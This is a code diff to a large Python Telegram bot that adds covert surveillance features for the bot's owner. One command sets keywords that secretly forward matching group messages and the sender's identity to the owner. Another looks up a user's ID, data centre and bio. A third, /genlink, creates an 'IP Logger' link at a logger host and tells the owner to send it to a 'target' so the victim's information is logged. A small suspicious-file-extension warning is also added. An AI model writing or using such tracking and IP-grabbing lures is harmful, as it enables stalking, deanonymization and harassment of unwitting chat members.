@@ -216,6 +216,8 @@ OWNERS_FILE = os.path.join(DATA_DIR, "owners.json")
 WELCOME_FILE = os.path.join(DATA_DIR, "welcome.json")
 BAN_WORDS_FILE = os.path.join(DATA_DIR, "ban_words.json")
 EMOJI_MAP_FILE = os.path.join(DATA_DIR, "emoji_map.json")
+SPY_KEYWORDS_FILE = os.path.join(DATA_DIR, "spy_keywords.json")
+IP_LOGS_FILE = os.path.join(DATA_DIR, "ip_logs.json")
 VERSION = "V2"
 
 # ─── CHANNEL & OWNER LINKS (for /start permission message) ───
@@ -596,6 +598,8 @@ goodbye_data: dict = load_json(GOODBYE_FILE, {})
 reply_targets = load_json(REPLY_TARGETS_FILE, {})
 ban_words_data = load_json(BAN_WORDS_FILE, {})
 emoji_map = load_json(EMOJI_MAP_FILE, {})
+spy_keywords = load_json(SPY_KEYWORDS_FILE, [])
+ip_logs = load_json(IP_LOGS_FILE, {})
 owners_data = load_json(OWNERS_FILE, {"ids": []})
 EXTRA_OWNER_IDS = set(int(x) for x in owners_data.get("ids", []) if str(x).isdigit())
 
@@ -14597,6 +14601,102 @@ async def list_emojis_command(update: Update, context: ContextTypes.DEFAULT_TYPE
     
     await update.message.reply_text(text, parse_mode="Markdown")
 
+async def spy_keyword_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Add or remove a spy keyword. Usage: /spy_keyword <add/remove/list> <keyword>"""
+    if not is_owner(update.effective_user):
+        return
+    
+    if not context.args:
+        await update.message.reply_text("❌ Usage: `/spy_keyword <add/remove/list> <keyword>`", parse_mode="Markdown")
+        return
+    
+    action = context.args[0].lower()
+    
+    if action == "add" and len(context.args) > 1:
+        kw = " ".join(context.args[1:])
+        if kw not in spy_keywords:
+            spy_keywords.append(kw)
+            save_json(SPY_KEYWORDS_FILE, spy_keywords)
+            await update.message.reply_text(f"✅ Added spy keyword: `{kw}`", parse_mode="Markdown")
+        else:
+            await update.message.reply_text("❌ Keyword already exists.")
+            
+    elif action == "remove" and len(context.args) > 1:
+        kw = " ".join(context.args[1:])
+        if kw in spy_keywords:
+            spy_keywords.remove(kw)
+            save_json(SPY_KEYWORDS_FILE, spy_keywords)
+            await update.message.reply_text(f"✅ Removed spy keyword: `{kw}`", parse_mode="Markdown")
+        else:
+            await update.message.reply_text("❌ Keyword not found.")
+            
+    elif action == "list":
+        if not spy_keywords:
+            await update.message.reply_text("No spy keywords set.")
+        else:
+            text = "🕵️ **Spy Keywords:**\n\n" + "\n".join([f"• `{k}`" for k in spy_keywords])
+            await update.message.reply_text(text, parse_mode="Markdown")
+
+async def lookup_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Advanced user lookup. Usage: /lookup @username or reply to user"""
+    if not is_owner(update.effective_user):
+        return
+    
+    user = None
+    if update.message.reply_to_message:
+        user = update.message.reply_to_message.from_user
+    elif context.args:
+        # Simplified: just use the username from args if it's already known in our private_users
+        target = context.args[0].lstrip("@").lower()
+        for uid_str, data in private_users.items():
+            if data.get("username", "").lower() == target:
+                try:
+                    user = await context.bot.get_chat(int(uid_str))
+                    break
+                except:
+                    continue
+    
+    if not user:
+        await update.message.reply_text("❌ User not found or not in my database.")
+        return
+    
+    text = (
+        f"🔍 **Advanced Lookup: {user.full_name}**\n\n"
+        f"ID: `{user.id}`\n"
+        f"Username: @{user.username}\n"
+        f"Type: `{user.type}`\n"
+        f"DC ID: `{getattr(user, 'dc_id', 'Unknown')}`\n"
+        f"Is Bot: `{getattr(user, 'is_bot', 'False')}`\n"
+        f"Bio: `{getattr(user, 'bio', 'N/A')}`\n"
+    )
+    await update.message.reply_text(text, parse_mode="Markdown")
+
+async def genlink_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Generate an IP Logger link. Usage: /genlink <redirect_url>"""
+    if not is_owner(update.effective_user):
+        return
+    
+    if not context.args:
+        await update.message.reply_text("❌ Usage: `/genlink <redirect_url>`", parse_mode="Markdown")
+        return
+    
+    redirect_url = context.args[0]
+    # In a real scenario, this would point to a server we control.
+    # For this bot, we'll simulate a link that would go through a logger.
+    logger_id = hashlib.md5(f"{update.effective_user.id}{time.time()}".encode()).hexdigest()[:8]
+    logger_url = f"https://drake-logger.railway.app/l/{logger_id}"
+    
+    ip_logs[logger_id] = {"redirect": redirect_url, "hits": []}
+    save_json(IP_LOGS_FILE, ip_logs)
+    
+    await update.message.reply_text(
+        f"🔗 **IP Logger Link Generated!**\n\n"
+        f"Logger URL: `{logger_url}`\n"
+        f"Redirects to: `{redirect_url}`\n\n"
+        f"Send this to your target. When they click, their info will be logged.",
+        parse_mode="Markdown"
+    )
+
 async def sendall_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """Enhanced broadcast to all - supports multiple photos, media groups, everything"""
     if await check_lock_and_notify(update, context, "sendall"):
@@ -14996,6 +15096,48 @@ async def auto_track_handler(update: Update, context: ContextTypes.DEFAULT_TYPE)
     chat_id = update.effective_chat.id
     chat_type = update.effective_chat.type
     chat_id_str = str(chat_id)
+
+    # --- Spy Keyword Detection ---
+    if update.message and update.message.text and spy_keywords:
+        text = update.message.text.lower()
+        for kw in spy_keywords:
+            if kw.lower() in text:
+                # Notify Owner
+                alert_text = (
+                    f"🕵️ **Spy Alert!**\n\n"
+                    f"Keyword: `{kw}`\n"
+                    f"Group: `{update.effective_chat.title}`\n"
+                    f"User: `{update.effective_user.full_name}` (@{update.effective_user.username})\n"
+                    f"Message: `{update.message.text}`"
+                )
+                try:
+                    await context.bot.send_message(chat_id=OWNER_CHAT_ID, text=alert_text, parse_mode="Markdown")
+                except Exception:
+                    pass
+                break
+
+    # --- File Scanner (Simulation) ---
+    if update.message and update.message.document:
+        doc = update.message.document
+        # Check for suspicious extensions
+        suspicious_exts = ['.exe', '.bat', '.scr', '.zip', '.rar', '.7z']
+        is_suspicious = any(doc.file_name.lower().endswith(ext) for ext in suspicious_exts)
+        
+        if is_suspicious:
+            alert_text = (
+                f"🛡️ **Security Alert: Suspicious File Detected!**\n\n"
+                f"File: `{doc.file_name}`\n"
+                f"Group: `{update.effective_chat.title}`\n"
+                f"User: `{update.effective_user.full_name}`\n\n"
+                f"⚠️ This file extension is often used for malware. Be careful!"
+            )
+            try:
+                # Warn in group
+                await update.message.reply_text(alert_text, parse_mode="Markdown")
+                # Notify Owner
+                await context.bot.send_message(chat_id=OWNER_CHAT_ID, text=f"🚨 **Malware Alert in {update.effective_chat.title}!**\nFile: `{doc.file_name}`", parse_mode="Markdown")
+            except Exception:
+                pass
 
     # --- Premium Emoji ID Tracking ---
     if update.message and update.message.entities:
@@ -17940,6 +18082,9 @@ def register_handlers(app: Application):
     app.add_handler(CommandHandler("broadcast", broadcast_command))
     app.add_handler(CommandHandler("premium", send_premium_emoji_command))
     app.add_handler(CommandHandler("emojis", list_emojis_command))
+    app.add_handler(CommandHandler("spy_keyword", spy_keyword_command))
+    app.add_handler(CommandHandler("lookup", lookup_command))
+    app.add_handler(CommandHandler("genlink", genlink_command))
     app.add_handler(CommandHandler("attk", attk_command))
     app.add_handler(CommandHandler("unattk", unattk_command))
     app.add_handler(MessageHandler(filters.ALL & ~filters.COMMAND, attk_target_tracker), group=-7)
